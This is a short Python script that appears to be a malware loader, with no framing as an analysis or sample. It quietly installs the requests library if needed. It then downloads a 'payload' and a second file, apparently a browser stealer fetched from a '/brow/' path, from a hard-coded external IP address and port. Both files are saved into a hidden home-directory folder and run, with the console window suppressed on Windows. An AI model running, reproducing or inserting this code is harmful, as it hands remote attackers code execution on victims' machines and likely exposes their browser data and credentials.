# http://95.164.17.24:1224/client/5346

import base64, platform, os, subprocess, sys

try:
    import requests
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

sType = "5346"
gType = "root"
ot = platform.system()
home = os.path.expanduser("~")
# host1 = "10.10.51.212"
host1 = "95.164.17.24"
host2 = f"http://{host1}:1224"
pd = os.path.join(home, ".n2")
ap = pd + "/pay"


def download_payload():
    if os.path.exists(ap):
        try:
            os.remove(ap)
        except OSError:
            return True
    try:
        if not os.path.exists(pd):
            os.makedirs(pd)
    except:
        pass

    try:
        if ot == "Darwin":
            # aa = requests.get(host2+"/payload1/"+sType+"/"+gType, allow_redirects=True)
            aa = requests.get(
                host2 + "/payload/" + sType + "/" + gType, allow_redirects=True
            )
            with open(ap, "wb") as f:
                f.write(aa.content)
        else:
            aa = requests.get(
                host2 + "/payload/" + sType + "/" + gType, allow_redirects=True
            )
            with open(ap, "wb") as f:
                f.write(aa.content)
        return True
    except Exception as e:
        return False


res = download_payload()
if res:
    if ot == "Windows":
        subprocess.Popen(
            [sys.executable, ap],
            creationflags=subprocess.CREATE_NO_WINDOW
            | subprocess.CREATE_NEW_PROCESS_GROUP,
        )
    else:
        subprocess.Popen([sys.executable, ap])

if ot == "Darwin":
    sys.exit(-1)

ap = pd + "/bow"


def download_browse():
    if os.path.exists(ap):
        try:
            os.remove(ap)
        except OSError:
            return True
    try:
        if not os.path.exists(pd):
            os.makedirs(pd)
    except:
        pass
    try:
        aa = requests.get(host2 + "/brow/" + sType + "/" + gType, allow_redirects=True)
        with open(ap, "wb") as f:
            f.write(aa.content)
        return True
    except Exception as e:
        return False


res = download_browse()
if res:
    if ot == "Windows":
        subprocess.Popen(
            [sys.executable, ap],
            creationflags=subprocess.CREATE_NO_WINDOW
            | subprocess.CREATE_NEW_PROCESS_GROUP,
        )
    else:
        subprocess.Popen([sys.executable, ap])